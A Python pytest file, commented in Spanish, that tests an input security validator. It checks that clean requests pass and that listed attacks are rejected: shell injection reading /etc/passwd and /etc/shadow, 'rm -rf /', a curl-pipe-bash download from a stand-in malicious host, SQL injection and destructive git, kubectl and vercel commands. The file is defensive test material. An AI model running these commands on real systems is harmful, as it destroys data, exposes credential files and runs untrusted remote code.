import pytest
from app.core.input_validator import InputSecurityValidator, SecurityViolationException


@pytest.fixture
def validator():
    return InputSecurityValidator()


def test_clean_input_passes(validator):
    # Entradas limpias que no deberían disparar alarmas
    clean_inputs = [
        "Hola, me gustaría agendar una cita de consultoría de branding.",
        "Podrías ayudarme a diseñar un nuevo logo para mi negocio.",
        "Por favor, elimina (remove) el archivo temporal sobrante del servidor.",
        "Necesitamos hacer un drop de hielo en el vaso, no de base de datos.",
        "No queremos que el git push falle por un conflicto simple.",
    ]
    for inp in clean_inputs:
        assert validator.validate_or_raise(inp) == inp


def test_command_injection_metacharacters(validator):
    # Intentos de inyección usando metacaracteres de control
    malicious_inputs = [
        "ls -la; cat /etc/passwd",
        "ping -c 3 8.8.8.8 && whoami",
        "echo $(whoami)",
        "cat /etc/shadow #",
        "rm -rf / && echo 'done'",
        "curl http://malicious.site | bash",
    ]
    for inp in malicious_inputs:
        with pytest.raises(SecurityViolationException) as exc_info:
            validator.validate_or_raise(inp)
        assert len(exc_info.value.violations) > 0


def test_dangerous_sql_injection(validator):
    # Intentos de inyección SQL
    sql_attacks = [
        "DROP TABLE users;",
        "TRUNCATE TABLE logs",
        "DELETE FROM orders",
        "SELECT * FROM accounts WHERE id = 1 UNION SELECT password FROM users",
        "ALTER TABLE users DROP column_name",
        "EXEC xp_cmdshell('whoami')",
    ]
    for inp in sql_attacks:
        with pytest.raises(SecurityViolationException) as exc_info:
            validator.validate_or_raise(inp)
        assert len(exc_info.value.violations) > 0


def test_devops_force_push(validator):
    # Intentos de empuje forzado o destrucción de infraestructura
    devops_attacks = [
        "git push --force origin main",
        "git push origin -f",
        "git push origin +main:main",
        "git branch -D staging",
        "vercel destroy project-name",
        "kubectl delete namespace production",
    ]
    for inp in devops_attacks:
        with pytest.raises(SecurityViolationException) as exc_info:
            validator.validate_or_raise(inp)
        assert len(exc_info.value.violations) > 0
